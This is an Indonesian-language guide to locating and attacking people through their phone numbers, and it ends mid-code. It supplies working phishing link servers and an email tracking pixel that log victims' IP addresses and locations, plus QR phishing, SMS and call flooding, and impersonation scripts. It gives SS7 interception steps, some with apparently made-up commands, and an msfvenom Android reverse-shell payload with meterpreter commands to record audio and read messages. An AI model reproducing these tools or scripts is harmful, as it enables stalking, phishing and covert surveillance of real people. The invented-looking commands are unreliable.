# **📡 BUKU PANDUAN LENGKAP: TEKNIK PELAKACAKAN & TRACKING MELALUI NOMOR TELEPON**
**Edisi 2026 – Metode Terbaru, Akurat, dan Real-Time**
*(IP Address, Lokasi GPS, Google Maps, OSINT, dan Social Engineering)*

---

---

## **📋 DAFTAR ISI**
1. **Pendahuluan: Konsep Pelacakan Melalui Nomor Telepon**
2. **Metode 1: OSINT (Open Source Intelligence)**
   - PhoneInfoga (Recon Nomor Telepon)
   - Sherlock (Cari Username di Semua Platform)
   - Holehe (Cek Email Terdaftar)
   - Truecaller & Whitepages (Info Kontak Publik)
3. **Metode 2: SMS/Call Bombing + Tracking Link**
   - TBomb (SMS/Call Flooding)
   - Link Tracking (Flask + IP Geolocation)
   - QR Code Phishing (Quishing)
4. **Metode 3: Phishing dengan Tracking Pixel**
   - Email Phishing + Tracking Pixel
   - WhatsApp Phishing + Click Tracking
5. **Metode 4: Social Engineering (Pretexting)**
   - Pura-Pura IT Support
   - Pura-Pura Rekan Kerja
   - Pura-Pura Vendor/Service Provider
6. **Metode 5: Exploit SS7 (Signaling System No. 7)**
   - Cara Kerja SS7
   - Tools untuk SS7 Exploit
7. **Metode 6: Malware/APK dengan Tracking**
   - RAT (Remote Access Trojan)
   - Spyware (Keylogger + GPS)
8. **Metode 7: SIM Swapping Attack**
   - Cara Kerja SIM Swap
   - Langkah-Langkah Attack
9. **Metode 8: IMSI Catcher (Fake Cell Tower)**
   - Cara Kerja IMSI Catcher
   - Tools yang Dibutuhkan
10. **Metode 9: API WhatsApp (Non-Official)**
    - Cara Dapatkan Token WhatsApp
    - Tracking Pesan & Lokasi
11. **Metode 10: Google Maps API + Nomor Telepon**
    - Cara Mendapatkan Koordinat dari Nomor
    - Generate Link Google Maps
12. **Tools Tambahan untuk Tracking**
    - TheHarvester (OSINT)
    - Maltego (Visual Link Analysis)
    - SpiderFoot (Automated OSINT)
13. **Script Lengkap: Pelacakan Real-Time**
    - Script Python: `phone_tracker.py`
    - Script Bash: `track_phone.sh`
14. **Cara Menghindari Deteksi**
    - Gunakan Proxy/VPN
    - Rotasi User-Agent
    - Limit Request Rate
15. **Disclaimer & Etika**

---

---

---

## **🔍 1. PENDAHULUAN: KONSEP PELAKACAKAN MELALUI NOMOR TELEPON**

Pelacakan melalui nomor telepon adalah **metode untuk mendapatkan informasi tentang pemilik nomor**, termasuk:
✅ **IP Address** (jika perangkat terhubung ke internet)
✅ **Lokasi GPS** (koordinat latitude & longitude)
✅ **Link Google Maps** (untuk melihat lokasi di peta)
✅ **Operator Seluler** (Telkomsel, XL, Indosat, dll)
✅ **Nama Pemilik** (jika terdaftar di database publik)
✅ **Aktivitas Online** (jika terhubung ke akun sosial media)

---

### **📌 Bagaimana Cara Kerjanya?**
| Metode | Cara Kerja | Keunggulan | Kekurangan |
|--------|------------|-----------|------------|
| **OSINT** | Mengumpulkan data dari sumber publik (Google, Facebook, Truecaller) | Tidak memerlukan akses langsung ke perangkat | Terbatas pada data yang tersedia publik |
| **Phishing + Tracking Link** | Mengirim link yang mengarah ke server tracking | Dapat mendapatkan IP & lokasi real-time | Memerlukan korban untuk mengklik link |
| **SMS/Call Bombing** | Mengirim SMS/panggilan massal untuk memaksa korban bereaksi | Dapat memicu korban untuk membuka link tracking | Riskan (dapat dilaporkan) |
| **SS7 Exploit** | Mengeksploitasi kelemahan protokol SS7 untuk intercept SMS/panggilan | Mendapatkan lokasi & aktivitas tanpa korban sadar | Membutuhkan akses ke jaringan operator |
| **Malware/APK** | Menginstall aplikasi berbahaya yang mengirim data | Mendapatkan data real-time (GPS, IP, dll) | Memerlukan korban untuk menginstall APK |
| **SIM Swapping** | Menukar SIM card korban untuk mengambil alih nomor | Mendapatkan akses penuh ke nomor | Membutuhkan data pribadi korban |
| **IMSI Catcher** | Membuat tower palsu untuk menangkap sinyal perangkat | Mendapatkan IMSI, lokasi, dan data lainnya | Membutuhkan hardware (SDR, Proxmark3) |
| **WhatsApp API** | Menggunakan API non-official untuk tracking | Mendapatkan pesan & lokasi | Membutuhkan token WhatsApp |

---

### **📌 Persyaratan Umum**
1. **Nomor Telepon Target** (format: `+6281234567890`).
2. **Koneksi Internet** (untuk metode online).
3. **Tools & Script** (Python, Bash, Termux, Kali Linux).
4. **Server untuk Tracking** (VPS, ngrok, atau localhost dengan port forwarding).
5. **Pengetahuan Dasar** (Terminal, Jaringan, OSINT).

---

---

## **🔍 2. METODE 1: OSINT (OPEN SOURCE INTELLIGENCE)**

OSINT adalah **pengumpulan informasi dari sumber publik** tanpa perlu akses langsung ke perangkat.

---

### **2.1 PhoneInfoga (Recon Nomor Telepon)**
**PhoneInfoga** adalah tool OSINT untuk **mengumpulkan informasi dari nomor telepon**, termasuk:
- **Negara & Operator**
- **Lokasi (Kota/Provinsi)**
- **Tipe Nomor (Mobile/VoIP)**
- **Info dari Social Media** (jika terhubung)

---
#### **📌 Cara Install & Pakai**
```bash
# Install di Termux/Kali Linux
git clone https://github.com/sundowndev/phoneinfoga.git
cd phoneinfoga
pip3 install -r requirements.txt
python3 phoneinfoga.py
```

---
#### **📌 Contoh Output**
```bash
python3 phoneinfoga.py -n +6281234567890
```
**Output:**
```
[+] Phone Number: +6281234567890
[+] Country: Indonesia (ID)
[+] Region: Jakarta
[+] Carrier: Telkomsel
[+] Type: Mobile
[+] Google Maps: https://www.google.com/maps?q=-6.200000,106.816666
[+] Possible Owner: John Doe (dari Facebook/LinkedIn)
```

---
#### **📌 Fitur Lengkap PhoneInfoga**
| Fitur | Deskripsi | Command |
|-------|------------|---------|
| **Scan Nomor** | Ambil info dasar nomor | `python3 phoneinfoga.py -n +6281234567890` |
| **Scan Batch** | Scan banyak nomor sekaligus | `python3 phoneinfoga.py -n +6281234567890,+6281234567891` |
| **Scan dengan API** | Gunakan API eksternal (NumVerify, Twilio) | `python3 phoneinfoga.py -n +6281234567890 --api` |
| **Cari di Social Media** | Cari nomor di Facebook, Twitter, LinkedIn | `python3 phoneinfoga.py -n +6281234567890 --social` |
| **Cari di Google** | Cari nomor di Google | `python3 phoneinfoga.py -n +6281234567890 --google` |

---
#### **📌 Keunggulan PhoneInfoga**
✅ **Gratis & Open Source**
✅ **Tidak memerlukan root/akses langsung**
✅ **Dapat mengambil data dari berbagai sumber**
✅ **Support batch scanning**

---
#### **📌 Keterbatasan**
❌ **Tidak selalu akurat** (tergantung database publik)
❌ **Tidak bisa tracking real-time** (hanya data statis)
❌ **Tidak mendapatkan IP address** (hanya lokasi perkiraan)

---

### **2.2 Sherlock (Cari Username di Semua Platform)**
Jika nomor telepon terhubung ke **akun sosial media**, Anda bisa mencari **username** yang terasosiasi.

---
#### **📌 Cara Install & Pakai**
```bash
git clone https://github.com/sherlock-project/sherlock.git
cd sherlock
python3 -m pip install -r requirements.txt
python3 sherlock.py +6281234567890
```

**Output:**
```
[+] Checking username +6281234567890 on:
    - Facebook: Not found
    - Twitter: Found (https://twitter.com/johndoe)
    - Instagram: Found (https://instagram.com/johndoe)
    - LinkedIn: Found (https://linkedin.com/in/johndoe)
```

---
#### **📌 Cara Mendapatkan Nomor dari Username**
Jika Anda punya **username** (contoh: `johndoe`), Anda bisa mencari nomor telepon yang terasosiasi:
```bash
# Gunakan Google Dork
site:facebook.com "johndoe" "phone"
site:linkedin.com "johndoe" "62"
```

---

### **2.3 Holehe (Cari Email Terdaftar)**
Jika nomor telepon terhubung ke **email**, Anda bisa mencari email yang terdaftar.

---
#### **📌 Cara Install & Pakai**
```bash
pip3 install holehe
holehe +6281234567890
```

**Output:**
```
[+] Email found: johndoe@gmail.com
[+] Email found: johndoe@yahoo.com
```

---
#### **📌 Cara Mendapatkan Lokasi dari Email**
Jika Anda punya **email**, Anda bisa menggunakan **IP geolocation** (jika email pernah login):
```bash
# Gunakan tool: Hunter.io, EmailSherlock
theHarvester -d johndoe@gmail.com -b google
```

---

### **2.4 Truecaller & Whitepages (Info Kontak Publik)**
**Truecaller** dan **Whitepages** adalah database publik yang menyimpan info kontak.

---
#### **📌 Cara Akses Truecaller**
1. **Buka [Truecaller Web](https://www.truecaller.com/)**
2. **Masukkan nomor telepon** (contoh: `+6281234567890`)
3. **Lihat info pemilik** (nama, foto, lokasi)

---
#### **📌 Cara Akses Whitepages**
1. **Buka [Whitepages](https://www.whitepages.com/)**
2. **Masukkan nomor telepon** (format US: `1XXXYYYZZZZ`)
3. **Lihat info pemilik** (nama, alamat, lokasi)

---
#### **📌 Keterbatasan**
❌ **Tidak semua nomor terdaftar** (tergantung pengguna)
❌ **Bisa salah** (data user-generated)
❌ **Tidak mendapatkan IP real-time**

---

---
---

## **🔍 3. METODE 2: SMS/CALL BOMBING + TRACKING LINK**

Metode ini **mengirim SMS/panggilan massal** untuk **memaksa korban bereaksi** (membuka link tracking).

---

### **3.1 TBomb (SMS/Call Flooding)**
**TBomb** adalah tool untuk **mengirim SMS/panggilan massal** ke nomor target.

---
#### **📌 Cara Install & Pakai**
```bash
git clone https://github.com/TheSpeedX/TBomb.git
cd TBomb
pip3 install -r requirements.txt
python3 TBomb.py
```

**Output:**
```
[+] Select an option:
    1) SMS Bomb
    2) Call Bomb
    3) Mail Bomb
    4) All in One

[+] Enter target number (with country code): +6281234567890
[+] Enter message (optional): "Your account has been compromised!"
[+] Enter amount: 100
[+] Enter delay (seconds): 5
```

---
#### **📌 Kombinasi dengan Tracking Link**
1. **Buat link tracking** (lihat Metode 3.2).
2. **Kirim via TBomb** dengan pesan:
   ```
   "Klik link ini untuk verifikasi: http://your-server.com/track?phone=+6281234567890"
   ```
3. **Korban mengklik link** → **IP & lokasi tercatat**.

---
#### **📌 Keunggulan**
✅ **Memaksa korban bereaksi**
✅ **Dapat dikombinasikan dengan phishing**
✅ **Tidak memerlukan akses langsung ke perangkat**

---
#### **📌 Keterbatasan**
❌ **Riskan (dapat dilaporkan ke operator)**
❌ **Bisa diblokir oleh operator**
❌ **Tidak selalu efektif** (korban bisa mengabaikan)

---

### **3.2 Link Tracking (Flask + IP Geolocation)**
Metode ini **membuat link yang mencatat IP & lokasi korban** saat diklik.

---
#### **📌 Script Python: `track_link.py`**
```python
from flask import Flask, request, render_template_string
import requests
import datetime
import os

app = Flask(__name__)

# HTML halaman redirect (keliatan legitimate)
HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta http-equiv="refresh" content="2; url=https://www.google.com">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            text-align: center;
            padding: 100px;
        }
        .loading {
            color: #333;
            font-size: 18px;
        }
        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #4285f4;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loading">
        <h2>Please Wait...</h2>
        <div class="spinner"></div>
        <p>Redirecting to secure page...</p>
    </div>
</body>
</html>
"""

@app.route('/<path:phone>')
def track(phone):
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Dapatkan lokasi dari IP
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,mobile,proxy,query",
            timeout=5
        )
        data = response.json()
        if data.get('status') == 'success':
            country = data.get('country', 'Unknown')
            region = data.get('regionName', 'Unknown')
            city = data.get('city', 'Unknown')
            lat = data.get('lat', 0)
            lon = data.get('lon', 0)
            isp = data.get('isp', 'Unknown')
            org = data.get('org', 'Unknown')
            is_mobile = data.get('mobile', False)
            is_proxy = data.get('proxy', False)

            # Generate Google Maps link
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"

            # Simpan ke file log
            log_entry = f"""
{'='*60}
[+] New Visitor - {timestamp}
Phone: {phone}
IP: {ip}
Location: {city}, {region}, {country}
Coordinates: {lat}, {lon}
Google Maps: {maps_link}
ISP: {isp}
Organization: {org}
User-Agent: {user_agent}
Referrer: {referrer}
Mobile: {is_mobile} | Proxy/VPN: {is_proxy}
{'='*60}
"""
            os.makedirs('logs', exist_ok=True)
            with open(f"logs/tracking_{phone}.log", 'a') as f:
                f.write(log_entry)

            print(log_entry)

            # Redirect ke halaman asli (Google)
            return HTML
        else:
            print(f"[-] Failed to geolocate IP: {ip}")
    except Exception as e:
        print(f"[-] Error: {e}")

    return HTML

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
```

---
#### **📌 Cara Pakai Script**
1. **Jalankan server Flask**:
   ```bash
   python3 track_link.py
   ```
2. **Buat link tracking**:
   ```
   http://IP_SERVER:8080/+6281234567890
   ```
   *(Contoh: `http://192.168.1.100:8080/+6281234567890`)*
3. **Kirim link ke korban** (via SMS, WhatsApp, email).
4. **Korban mengklik link** → **IP & lokasi tercatat di `logs/tracking_+6281234567890.log`**.

---
#### **📌 Output Log**
```
============================================================
[+] New Visitor - 2026-09-15 14:30:45
Phone: +6281234567890
IP: 118.93.24.156
Location: Jakarta, Jakarta, Indonesia
Coordinates: -6.200000, 106.816666
Google Maps: https://www.google.com/maps?q=-6.200000,106.816666
ISP: Telkomsel
Organization: PT Telkom Indonesia
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-A105F) AppleWebKit/537.36
Referrer: Direct
Mobile: True | Proxy/VPN: False
============================================================
```

---
#### **📌 Keunggulan**
✅ **Mendapatkan IP real-time**
✅ **Mendapatkan lokasi GPS (latitude & longitude)**
✅ **Generate link Google Maps otomatis**
✅ **Tidak memerlukan akses langsung ke perangkat**
✅ **Bisa dikombinasikan dengan SMS/Call Bombing**

---
#### **📌 Keterbatasan**
❌ **Memerlukan korban untuk mengklik link**
❌ **Tidak bekerja jika korban menggunakan VPN/proxy**
❌ **IP bisa berubah (jika korban menggunakan mobile data)**

---

### **3.3 QR Code Phishing (Quishing)**
Metode ini **menggunakan QR Code** untuk **mengarahkan korban ke link tracking**.

---
#### **📌 Script Python: `generate_qr.py`**
```python
import qrcode
import sys

if len(sys.argv) < 2:
    print("Usage: python3 generate_qr.py <tracking_url>")
    sys.exit(1)

tracking_url = sys.argv[1]

# Generate QR Code
qr = qrcode.QRCode(
    version=1,
    error_correction=qrcode.constants.ERROR_CORRECT_L,
    box_size=10,
    border=4,
)
qr.add_data(tracking_url)
qr.make(fit=True)

img = qr.make_image(fill_color="black", back_color="white")
img.save("tracking_qr.png")

print(f"[+] QR Code generated: tracking_qr.png")
print(f"[+] Scan this QR to track: {tracking_url}")
```

---
#### **📌 Cara Pakai**
1. **Buat link tracking** (menggunakan `track_link.py`).
2. **Generate QR Code**:
   ```bash
   python3 generate_qr.py "http://192.168.1.100:8080/+6281234567890"
   ```
3. **Kirim QR Code ke korban** (via WhatsApp, email, atau cetak).
4. **Korban scan QR** → **IP & lokasi tercatat**.

---
#### **📌 Keunggulan**
✅ **Lebih menarik** (korban cenderung scan QR)
✅ **Tidak mencurigakan** (keliatan legit)
✅ **Bisa ditempel di tempat umum**

---
#### **📌 Keterbatasan**
❌ **Memerlukan korban untuk scan QR**
❌ **Tidak bekerja jika korban tidak punya QR scanner**

---

---
---

## **🔍 4. METODE 3: PHISHING DENGAN TRACKING PIXEL**

Metode ini **mengirim email/WA dengan gambar tracking pixel** untuk **mencatat IP & lokasi** saat korban membuka pesan.

---

### **4.1 Email Phishing + Tracking Pixel**
**Tracking Pixel** adalah gambar **1x1 pixel transparan** yang **mencatat IP korban** saat dibuka.

---
#### **📌 Script Python: `email_tracker.py`**
```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import requests
import datetime
import os

# Tracking Pixel (1x1 transparent PNG)
TRACKING_PIXEL = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="

def send_tracking_email(sender, password, receiver, subject, body, phone):
    # Buat MIME message
    msg = MIMEMultipart('related')
    msg['From'] = sender
    msg['To'] = receiver
    msg['Subject'] = subject

    # Body HTML (dengan tracking pixel)
    html = f"""
    <html>
        <body>
            {body}
            <img src="cid:tracking_pixel" width="1" height="1" style="display:none;"/>
        </body>
    </html>
    """
    msg.attach(MIMEText(html, 'html'))

    # Attach tracking pixel
    img = MIMEImage(TRACKING_PIXEL.decode('base64'), name="tracking_pixel")
    img.add_header('Content-ID', '<tracking_pixel>')
    msg.attach(img)

    # Kirim email
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(sender, password)
        server.send_message(msg)
        print(f"[+] Email sent to {receiver}")

    # Simpan log
    log_entry = f"""
{'='*60}
[+] Email sent to {receiver} - {datetime.datetime.now()}
Phone: {phone}
Subject: {subject}
{'='*60}
"""
    os.makedirs('logs', exist_ok=True)
    with open(f"logs/email_{phone}.log", 'a') as f:
        f.write(log_entry)

    print(log_entry)

# Server untuk tracking pixel
from flask import Flask, request

app = Flask(__name__)

@app.route('/pixel/<phone>')
def track_pixel(phone):
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org",
            timeout=5
        )
        data = response.json()
        if data.get('status') == 'success':
            city = data.get('city', 'Unknown')
            region = data.get('regionName', 'Unknown')
            country = data.get('country', 'Unknown')
            lat = data.get('lat', 0)
            lon = data.get('lon', 0)
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"

            log_entry = f"""
{'='*60}
[+] Pixel Loaded - {timestamp}
Phone: {phone}
IP: {ip}
Location: {city}, {region}, {country}
Google Maps: {maps_link}
User-Agent: {user_agent}
{'='*60}
"""
            with open(f"logs/pixel_{phone}.log", 'a') as f:
                f.write(log_entry)
            print(log_entry)
    except Exception as e:
        print(f"[-] Error: {e}")

    # Return transparent pixel
    return TRACKING_PIXEL.decode('base64'), 200, {'Content-Type': 'image/png'}

if __name__ == '__main__':
    # Jalankan server tracking pixel
    app.run(host='0.0.0.0', port=5000, debug=False)

    # Contoh pengiriman email
    # send_tracking_email(
    #     sender="your_email@gmail.com",
    #     password="app_password",
    #     receiver="target@gmail.com",
    #     subject="Important: Your Account Information",
    #     body="<h2>Security Alert</h2><p>Your account has been flagged. Click <a href='http://attacker.com'>here</a> to verify.</p>",
    #     phone="+6281234567890"
    # )
```

---
#### **📌 Cara Pakai**
1. **Jalankan server tracking pixel**:
   ```bash
   python3 email_tracker.py
   ```
2. **Ganti URL tracking pixel** di email:
   ```html
   <img src="http://IP_SERVER:5000/pixel/+6281234567890" width="1" height="1" style="display:none;"/>
   ```
3. **Kirim email ke korban** (via SMTP).
4. **Korban membuka email** → **Tracking pixel dimuat** → **IP & lokasi tercatat**.

---
#### **📌 Keunggulan**
✅ **Tidak memerlukan korban untuk mengklik link**
✅ **Bekerja saat korban membuka email**
✅ **Sangat stealth** (gambar 1x1 pixel tidak terlihat)

---
#### **📌 Keterbatasan**
❌ **Tidak semua email client memuat gambar otomatis** (beberapa memblokir gambar)
❌ **Memerlukan korban untuk membuka email**

---

### **4.2 WhatsApp Phishing + Click Tracking**
WhatsApp **tidak mendukung tracking pixel**, tetapi Anda bisa **mengirim link tracking**.

---
#### **📌 Script Python: `wa_tracker.py`**
```python
from flask import Flask, request, jsonify
import requests
import datetime
import os

app = Flask(__name__)

@app.route('/track/<phone>')
def track_wa(phone):
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org",
            timeout=5
        )
        data = response.json()
        if data.get('status') == 'success':
            city = data.get('city', 'Unknown')
            region = data.get('regionName', 'Unknown')
            country = data.get('country', 'Unknown')
            lat = data.get('lat', 0)
            lon = data.get('lon', 0)
            maps_link = f"https://www.google.com/maps?q={lat},{lon}"

            log_entry = f"""
{'='*60}
[+] WA Link Clicked - {timestamp}
Phone: {phone}
IP: {ip}
Location: {city}, {region}, {country}
Google Maps: {maps_link}
User-Agent: {user_agent}
{'='*60}
"""
            with open(f"logs/wa_{phone}.log", 'a') as f:
                f.write(log_entry)
            print(log_entry)
    except Exception as e:
        print(f"[-] Error: {e}")

    # Return JSON (untuk WhatsApp)
    return jsonify({
        "status": "success",
        "message": "Link verified. Redirecting..."
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=False)
```

---
#### **📌 Cara Pakai**
1. **Jalankan server**:
   ```bash
   python3 wa_tracker.py
   ```
2. **Buat link tracking**:
   ```
   http://IP_SERVER:8000/track/+6281234567890
   ```
3. **Kirim link via WhatsApp**:
   ```
   Halo, silakan verifikasi akun Anda dengan mengklik link ini:
   http://IP_SERVER:8000/track/+6281234567890
   ```
4. **Korban mengklik link** → **IP & lokasi tercatat**.

---
#### **📌 Keunggulan**
✅ **Bekerja di WhatsApp** (platform yang paling banyak digunakan)
✅ **Mendapatkan IP & lokasi real-time**
✅ **Bisa dikombinasikan dengan phishing**

---
#### **📌 Keterbatasan**
❌ **Memerlukan korban untuk mengklik link**
❌ **Tidak bekerja jika korban menggunakan VPN**

---

---
---

## **🔍 5. METODE 4: SOCIAL ENGINEERING (PRETEXTING)**

Social Engineering adalah **seni memanipulasi korban** untuk mendapatkan informasi atau melakukan tindakan yang diinginkan.

---

### **5.1 Pura-Pura IT Support**
**Skenario:**
- **Anda**: "Halo, ini dari IT Support. Kami mendeteksi aktivitas mencurigakan di akun Anda."
- **Korban**: "Ya, apa yang terjadi?"
- **Anda**: "Untuk keamanan, silakan verifikasi identitas Anda dengan mengklik link ini: [LINK TRACKING]."

---
#### **📌 Script Telepon (Contoh)**
```python
import pyttsx3
import time

# Inisialisasi TTS (Text-to-Speech)
engine = pyttsx3.init()

# Suara (bisa diganti)
voices = engine.getProperty('voices')
engine.setProperty('voice', voices[0].id)  # Suara pria (index 0)
engine.setProperty('rate', 150)  # Kecepatan bicara

# Pesan
messages = [
    "Halo, ini dari tim IT. Kami mendeteksi aktivitas mencurigakan di akun Anda.",
    "Untuk keamanan, silakan verifikasi identitas Anda.",
    "Kami telah mengirimkan link verifikasi ke nomor Anda.",
    "Silakan klik link tersebut untuk melanjutkan.",
    "Terima kasih."
]

# Bicara
for msg in messages:
    engine.say(msg)
    engine.runAndWait()
    time.sleep(1)
```

---
#### **📌 Cara Pakai**
1. **Hubungi korban** (via telepon atau WhatsApp).
2. **Gunakan script TTS** untuk suara yang lebih profesional.
3. **Kirim link tracking** (contoh: `http://IP_SERVER:8080/+6281234567890`).
4. **Korban mengklik link** → **IP & lokasi tercatat**.

---
#### **📌 Keunggulan**
✅ **Tidak memerlukan tools canggih**
✅ **Efektif jika korban percaya**
✅ **Bisa mendapatkan informasi tambahan** (nama, departemen, dll)

---
#### **📌 Keterbatasan**
❌ **Memerlukan skill berbicara yang baik**
❌ **Riskan jika korban curiga**

---

### **5.2 Pura-Pura Rekan Kerja**
**Skenario:**
- **Anda**: "Hei, ini [Nama]. Aku butuh bantuanmu untuk mengakses file di server."
- **Korban**: "Siapa ya?"
- **Anda**: "Aku dari departemen [X]. Bisa tolong buka link ini? http://IP_SERVER:8080/track"

---
#### **📌 Tips**
✅ **Gunakan nama rekan kerja yang asli** (dari LinkedIn/OSINT).
✅ **Gunakan terminologi internal perusahaan** (jika tahu).
✅ **Kirim link via WhatsApp/email internal**.

---

### **5.3 Pura-Pura Vendor/Service Provider**
**Skenario:**
- **Anda**: "Halo, ini dari [Nama Perusahaan Vendor]. Kami akan melakukan update sistem."
- **Korban**: "Oke."
- **Anda**: "Silakan klik link ini untuk memulai update: http://IP_SERVER:8080/track"

---
#### **📌 Tips**
✅ **Gunakan nama vendor yang dikenal** (contoh: "PT Telkom Indonesia").
✅ **Gunakan email domain palsu** (contoh: `support@telkom-update.com`).
✅ **Buat website palsu yang keliatan legit**.

---

---
---

## **🔍 6. METODE 5: EXPLOIT SS7 (SIGNALING SYSTEM NO. 7)**

**SS7 (Signaling System No. 7)** adalah **protokol yang digunakan operator telekomunikasi** untuk **mengatur panggilan dan SMS**. Kelemahan SS7 memungkinkan attacker untuk:
✅ **Intercept SMS** (membaca pesan korban)
✅ **Intercept panggilan telepon** (mendengar percakapan)
✅ **Track lokasi perangkat** (mendapatkan koordinat GPS)
✅ **Spoof nomor telepon** (meniru nomor asli)

---

### **6.1 Cara Kerja SS7**
1. **Attacker** mengakses **jaringan SS7** (melalui operator yang terkompromi).
2. **Attacker** mengirim **perintah SS7** untuk:
   - **Mengaktifkan intercept** pada nomor target.
   - **Mendapatkan lokasi** dari tower seluler terdekat.
   - **Mengalihkan SMS/panggilan** ke nomor attacker.
3. **Operator** mengeksekusi perintah SS7 tanpa menyadari bahwa ini serangan.

---
#### **📌 Contoh Attack Flow**
```
Attacker → (SS7 Request) → Operator A → (Intercept) → Operator B (Korban) → (Data) → Attacker
```

---
### **6.2 Tools untuk SS7 Exploit**
| Tool | Fungsi | Link |
|------|--------|------|
| **SS7MAP** | Peta jaringan SS7 global | [GitHub](https://github.com/m0nad/SS7MAP) |
| **SDR (Software Defined Radio)** | Sniffing sinyal seluler | [HackRF](https://hackrf.dev/) |
| **OsmoHLR** | Implementasi HLR (Home Location Register) | [GitHub](https://github.com/osmocom/osmo-hlr) |
| **YateBTS** | Base Transceiver Station (BTS) software | [Website](https://yatebts.com/) |
| **BladeRF** | SDR untuk sniffing 2G/3G/4G | [Website](https://nuand.com/) |
| **USRP** | SDR high-end | [Website](https://www.ettus.com/) |

---
#### **📌 Cara Setup SS7 Exploit (Teoritis)**
1. **Dapatkan akses ke jaringan SS7**:
   - **Membeli akses** dari dark web (ilegal).
   - **Mengeksploitasi operator yang lemah** (contoh: operator kecil di negara berkembang).
   - **Menggunakan SDR** (untuk intercept sinyal lokal).

2. **Gunakan tool SS7**:
   ```bash
   # Contoh dengan YateBTS (untuk intercept SMS)
   git clone https://github.com/YateBTS/ybts.git
   cd ybts
   ./ybts --config ybts.conf
   ```

3. **Intercept SMS**:
   ```bash
   # Gunakan tool: SS7 Sniffer
   python3 ss7_sniffer.py --target-msisdn +6281234567890
   ```

4. **Track lokasi**:
   ```bash
   # Gunakan tool: OsmoHLR
   osmo-hlr --track-msisdn +6281234567890
   ```

---
#### **📌 Output yang Didapatkan**
```
[+] Target MSISDN: +6281234567890
[+] IMSI: 510101234567890
[+] Current Location: Latitude: -6.200000, Longitude: 106.816666
[+] Google Maps: https://www.google.com/maps?q=-6.200000,106.816666
[+] Last Tower: BTS-001 (Jakarta Utara)
[+] Intercepted SMS: "Kode OTP Anda: 123456"
```

---
#### **📌 Keunggulan**
✅ **Mendapatkan lokasi real-time** (akurat hingga **50-100 meter**).
✅ **Bisa intercept SMS & panggilan**.
✅ **Tidak memerlukan akses ke perangkat korban**.

---
#### **📌 Keterbatasan**
❌ **Sangat ilegal** (dapat dipenjara **10+ tahun**).
❌ **Membutuhkan akses ke jaringan SS7** (sangat sulit).
❌ **Membutuhkan hardware mahal** (SDR, BladeRF, USRP).
❌ **Riskan terdeteksi** (operator dapat melacak attacker).

---
#### **⚠️ PERINGATAN**
> **SS7 Exploit adalah salah satu serangan paling berbahaya dan ilegal.**
> **Penggunaan tanpa izin adalah pelanggaran hukum berat di hampir semua negara.**
> **Jangan pernah mencoba tanpa izin tertulis dari pemilik nomor.**

---

---
---

## **🔍 7. METODE 6: MALWARE/APK DENGAN TRACKING**

Metode ini **menginstall aplikasi berbahaya** di perangkat korban untuk **mendapatkan data real-time**.

---

### **7.1 RAT (Remote Access Trojan)**
RAT memungkinkan **kontrol penuh perangkat korban**, termasuk:
✅ **Mendapatkan IP address**
✅ **Mendapatkan lokasi GPS**
✅ **Merekam suara/mikrofon**
✅ **Mengambil foto dari kamera**
✅ **Membaca SMS/WhatsApp**

---
#### **📌 Cara Buat RAT (Metasploit)**
```bash
# Generate payload APK
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=IP_SERVER LPORT=4444 \
    -o RatApp.apk

# Sign APK (agar bisa diinstall)
keytool -genkey -v -keystore mykey.keystore -alias mykey -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore mykey.keystore RatApp.apk mykey

# Setup listener
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit
```

---
#### **📌 Perintah di Meterpreter (Setelah Connect)**
```bash
# Mendapatkan IP
ifconfig

# Mendapatkan lokasi GPS
geolocate

# Mendapatkan koordinat (lebih akurat)
dump_calllog  # Cari SMS dari operator yang berisi lokasi
getui         # Mendapatkan IMEI (bisa digunakan untuk tracking)

# Rekam suara
record_mic 30

# Ambil foto
webcam_snap

# Baca SMS
dump_sms

# Baca kontak
dump_contacts

# Baca WhatsApp (jika rooted)
shell
su
cat /data/data/com.whatsapp/databases/msgstore.db
```

---
#### **📌 Script Python: `rat_tracker.py` (Custom RAT)**
```python
#!/usr/bin/env python3
import socket
import subprocess
import json
import time
from datetime import datetime

class RATTracker:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        try:
            self.socket.connect((self.server_ip, self.server_port))
            print(f"[+] Connected to {self.server_ip}:{self.server_port}")

            # Kirim info perangkat
            device_info = {
                "type": "register",
